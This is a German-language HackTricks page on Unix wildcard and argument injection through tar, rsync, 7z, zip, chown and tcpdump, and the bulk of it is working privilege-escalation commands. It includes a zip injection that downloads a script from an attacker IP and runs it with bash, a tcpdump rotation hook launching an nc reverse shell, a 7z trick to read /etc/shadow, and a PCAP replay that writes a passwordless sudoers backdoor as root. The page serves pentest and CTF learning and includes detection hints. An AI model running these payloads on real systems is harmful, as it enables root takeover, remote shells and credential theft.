# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> **Argument injection** durch Wildcards (auch *glob* genannt) tritt auf, wenn ein privilegiertes Skript ein Unix-Binary wie `tar`, `chown`, `rsync`, `zip`, `7z`, … mit einer nicht in Anführungszeichen gesetzten Wildcard wie `*` ausführt.
> Da die Shell die Wildcard **vor** der Ausführung des Binary erweitert, kann ein Angreifer, der Dateien im Arbeitsverzeichnis erstellen kann, Dateinamen konstruieren, die mit `-` beginnen, sodass sie als **Optionen statt als Daten** interpretiert werden und dadurch beliebige Flags oder sogar Befehle eingeschleust werden können.
> Diese Seite sammelt die nützlichsten Primitives, aktuelle Forschung und moderne Erkennungsmethoden für 2023-2025.

## chown / chmod

Du kannst **Owner/Gruppe oder die Berechtigungsbits einer beliebigen Datei kopieren**, indem du das Flag `--reference` missbrauchst:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wenn root später etwas wie Folgendes ausführt:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` wird injiziert, wodurch *alle* passenden Dateien die Eigentumsrechte/Berechtigungen von `/root/secret``file` übernehmen.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinierter Angriff).  
Siehe auch das klassische DefenseCode-Paper für weitere Details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Führe beliebige Befehle aus, indem du die **checkpoint**-Funktion missbrauchst:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sobald root beispielsweise `tar -czf /root/backup.tgz *` ausführt, wird `shell.sh` als root ausgeführt.

### bsdtar / macOS 14+

Das standardmäßige `tar` in aktuellen macOS-Versionen (basierend auf `libarchive`) implementiert *nicht* `--checkpoint`, aber mit dem Flag **--use-compress-program**, über das du einen externen Kompressor angeben kannst, ist weiterhin code-execution möglich.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wenn ein privilegiertes Skript `tar -cf backup.tar *` ausführt, wird `/bin/sh` gestartet.

---

## rsync

Mit `rsync` können Sie die entfernte Shell oder sogar die entfernte Binärdatei über Befehlszeilenoptionen überschreiben, die mit `-e` oder `--rsync-path` beginnen:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Wenn root das Verzeichnis später mit `rsync -az * backup:/srv/` archiviert, startet das injizierte Flag deine Shell auf der Remote-Seite.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selbst wenn das privilegierte Script das Wildcard defensiv mit `--` voranstellt (um die Optionsverarbeitung zu verhindern), unterstützt das 7-Zip-Format **Dateilisten-Dateien**, indem dem Dateinamen `@` vorangestellt wird. In Kombination mit einem Symlink kannst du beliebige Dateien *exfiltrieren*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Wenn root etwas wie Folgendes ausführt:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip wird versuchen, `root.txt` (→ `/etc/shadow`) als Dateiliste zu lesen, und abbrechen, wobei **der Inhalt nach stderr ausgegeben wird**.

Dies funktioniert auch mit `-- *`, da die 7-Zip-CLI sowohl reguläre Dateinamen als auch `@listfiles` als positionale Eingaben ausdrücklich akzeptiert. Daher wird ein wörtlicher Dateiname wie `@root.txt` weiterhin speziell behandelt.

---

## zip

Es gibt zwei sehr praktische Primitives, wenn eine Anwendung benutzerkontrollierte Dateinamen an `zip` übergibt (entweder über einen Wildcard oder durch Auflisten von Namen ohne `--`).

- RCE über test hook: `-T` aktiviert „test archive“ und `-TT <cmd>` ersetzt den Tester durch ein beliebiges Programm (Langform: `--unzip-command <cmd>`). Wenn du Dateinamen einschleusen kannst, die mit `-` beginnen, teile die Flags auf unterschiedliche Dateinamen auf, damit das Parsen der Short-Options funktioniert:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Hinweise
- Versuche NICHT, einen einzelnen Dateinamen wie `'-T -TT <cmd>'` zu verwenden – short options werden zeichenweise geparst, und das wird fehlschlagen. Verwende separate tokens wie gezeigt.
- Wenn die Anwendung Schrägstriche aus Dateinamen entfernt, rufe einen bare host/IP ab (Standardpfad `/index.html`) und speichere die Datei lokal mit `-O`, führe sie anschließend aus.
- Du kannst das Parsing mit `-sc` (show processed argv) oder `-h2` (more help) debuggen, um zu verstehen, wie deine tokens verarbeitet werden.

Beispiel (lokales Verhalten mit zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Wenn die Web-Schicht `zip`-stdout/stderr zurückgibt (bei naiven Wrappers häufig), werden injizierte Flags wie `--help` oder Fehler durch ungültige Optionen in der HTTP-Antwort sichtbar. Dadurch lässt sich die Command-line-Injection bestätigen und das Anpassen der Payloads unterstützen.

---

## Zusätzliche Binaries, die für wildcard injection anfällig sind (kurze Liste 2023–2025)

Die folgenden Befehle wurden in modernen CTFs und realen Umgebungen missbraucht. Die Payload wird immer als *Dateiname* innerhalb eines beschreibbaren Verzeichnisses erstellt, das später mit einem Wildcard verarbeitet wird:

| Binary | Zu missbrauchendes Flag | Effekt |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → beliebige `@file` | Dateiinhalte lesen |
| `flock` | `-c <cmd>` | Befehl ausführen |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution über git via SSH |
| `scp`   | `-S <cmd>` | Beliebiges Programm anstelle von ssh starten |

Diese Primitives sind weniger verbreitet als die Klassiker *tar/rsync/zip*, sollten bei der Suche jedoch berücksichtigt werden.

---

## Suche nach verwundbaren Wrappers und Jobs

Aktuelle Fallstudien haben gezeigt, dass wildcard/argv injection nicht mehr nur ein **cron + tar**-Problem ist. Dieselbe Bug-Klasse tritt weiterhin auf bei:

- Web-Features, die "alles als zip/tar herunterladen" aus von Angreifern kontrollierten Upload-Verzeichnissen
- Debug-Shells von Herstellern/Appliances, die einen **tcpdump**-Wrapper mit von Angreifern kontrollierten Dateinamen-/Filterfeldern bereitstellen
- Backup- oder Rotationsjobs, die `tar`, `rsync`, `7z`, `zip`, `chown` oder `chmod` auf beschreibbaren Verzeichnissen ausführen

Nützliche Triage-Befehle:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Schnelle Heuristiken:

- `-- *` ist für viele GNU-Tools eine gute Lösung, aber **nicht** für `7z`/`7za`, da `@listfiles` separat geparst werden.
- Bei `zip` solltest du nach Wrappers suchen, die vom Benutzer kontrollierte Dateinamen direkt aufzählen; die Aufteilung von Short-Optionen (`-T` + `-TT <cmd>`) funktioniert auch ohne einen Shell-Glob.
- Bei `tcpdump` solltest du besonders auf Wrappers achten, mit denen du **output file names**, **rotation settings** oder **capture-file replay**-Argumente kontrollieren kannst.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wenn eine restricted shell oder ein vendor wrapper eine `tcpdump`-Befehlszeile durch Zusammenfügen von vom Benutzer kontrollierten Feldern erstellt (z. B. einen „file name“-Parameter), ohne strikte Quoting-/Validierungsregeln, kannst du zusätzliche `tcpdump`-Flags einschleusen. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Begrenzung der Dateianzahl) und `-z <cmd>` (Befehl nach der Rotation) ermöglicht arbitrary command execution als der Benutzer, der `tcpdump` ausführt (auf Appliances oft root).

Voraussetzungen:

- Du kannst `argv` beeinflussen, die an `tcpdump` übergeben werden (z. B. über einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Der Wrapper bereinigt weder Leerzeichen noch Tokens, die im Dateinamenfeld mit `-` beginnen.

Klassischer PoC (führt ein Reverse-Shell-Script aus einem writable path aus):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` erzwingt eine sofortige Rotation nach dem ersten passenden Paket.
- `-z <cmd>` führt den post-rotate-Befehl einmal pro Rotation aus. Viele Builds führen `<cmd> <savefile>` aus. Wenn `<cmd>` ein Script/Interpreter ist, stelle sicher, dass die Argumentbehandlung zu deinem Payload passt.

Varianten ohne Wechseldatenträger:

- Wenn du über ein anderes Primitive zum Schreiben von Dateien verfügst (z. B. einen separaten Command Wrapper, der Output-Redirection erlaubt), lege dein Script in einem bekannten Pfad ab und triggere `-z /bin/sh /path/script.sh` oder `-z /path/script.sh`, abhängig von der Semantik der jeweiligen Plattform.
- Einige Vendor-Wrapper rotieren in von Angreifern kontrollierbare Pfade. Wenn du den Pfad der rotierten Datei beeinflussen kannst (Symlink/Directory Traversal), kannst du `-z` so steuern, dass vollständig von dir kontrollierter Content ausgeführt wird, ohne externe Medien zu benötigen.

---

## sudoers: tcpdump mit Wildcards/zusätzlichen Argumenten → beliebiges Schreiben/Lesen und root

Sehr häufiges sudoers Anti-Pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Probleme
- Der `*`-glob und freizügige patterns beschränken nur das erste `-w`-Argument. `tcpdump` akzeptiert mehrere `-w`-Optionen; die letzte gewinnt.
- Die Regel legt keine anderen Optionen fest, daher sind `-Z`, `-r`, `-V` usw. erlaubt.

Primitives
- Zielpfad mit einem zweiten `-w` überschreiben (das erste erfüllt nur sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal innerhalb des ersten `-w`, um den eingeschränkten Verzeichnisbaum zu verlassen:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Erzwinge die Eigentümerschaft der Ausgabe mit `-Z root` (erstellt überall Dateien im Besitz von root):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Schreiben beliebiger Inhalte durch das Wiedergeben eines manipulierten PCAP über `-r` (z. B. zum Hinzufügen einer sudoers-Zeile):

<details>
<summary>Erstelle ein PCAP, das die exakte ASCII-Nutzlast enthält, und schreibe sie als root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Beliebiges Lesen von Dateien/Secret leak mit `-V <file>` (interpretiert eine Liste von savefiles). Fehlerdiagnosen geben häufig Zeilen wieder und leaken dadurch Inhalte:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referenzen

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
